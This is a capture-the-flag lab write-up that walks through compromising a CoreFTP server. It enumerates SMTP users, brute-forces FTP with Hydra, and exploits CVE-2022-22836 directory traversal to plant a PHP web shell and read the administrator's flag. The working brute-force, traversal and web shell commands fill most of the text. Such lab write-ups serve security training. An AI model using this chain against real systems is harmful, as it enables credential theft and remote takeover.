## 🔍 Enumeration

First things first — let's see what we're working with.

bash

````bash
sudo nmap -sC -sV -A -T4 -p 21,25,80,443,587,3306,3389 10.129.13.41 -oA ~/easy/nmap/full_scan
```

The scan reveals a few interesting ports — notably **FTP (21)**, **SMTP (25)**, and **HTTPS (443)**. The FTP banner immediately gives us something juicy:
```
220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
````

Build 725. We'll come back to that.

## 👤 User Enumeration via SMTP

SMTP is open — time to enumerate valid users with `smtp-user-enum`:

bash

```bash
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.13.41
```

We get a hit: **`fiona`** is a valid user on the domain. Now let's get her password.

## 🔓 FTP Brute Force

With a valid username in hand, we unleash Hydra against the FTP service:

bash

````bash
hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.13.41 -u -t 1
```

And rockyou delivers (as always 🙄):
```
fiona : 987654321
````

## 📂 FTP Pillaging

Let's grab everything off the FTP server in one shot:

bash

```bash
wget -m --no-passive ftp://fiona:987654321@10.129.203.7
```

We pull down two files:

- `docs.txt` — nothing interesting
- `WebServersInfo.txt` — **bingo!** Confirms CoreFTP is running and gives us info about the web server setup

The WebServersInfo.txt file is the breadcrumb we needed — CoreFTP's web interface is exposed on port 443, and XAMPP is running underneath it.

---

## 💥 Exploitation — CVE-2022-22836

CoreFTP Server before build 727 is vulnerable to an **authenticated directory traversal** via HTTP PUT requests. The `..%2F` path traversal in the URL bypasses the FTP root restriction, letting us write files anywhere on the filesystem.

bash

```bash
searchsploit coreftp
# CoreFTP Server build 725 - Directory Traversal (Authenticated) | windows/remote/50652.txt
```

The PoC is simple — craft a PUT request with a traversal path. We use this to drop a webshell directly into XAMPP's htdocs:

bash

```bash
curl -k -X PUT \
  -H "Host: 10.129.203.7" \
  --basic -u fiona:987654321 \
  --data-binary '<?php echo shell_exec($_GET["c"]);?>' \
  --path-as-is "https://10.129.203.7/../../../../../../xampp/htdocs/1af271ec0935f7ccbd31dc24666f7f33.php"
```

Response: **200 OK** ✅ — shell written successfully.

---

## 🎯 Remote Code Execution

With our webshell sitting in htdocs, we can now execute commands directly on the server via HTTP:

bash

```bash
curl -w "\n" "http://10.129.203.7/1af271ec0935f7ccbd31dc24666f7f33.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt"
```

And just like that — **flag captured!** 🏁
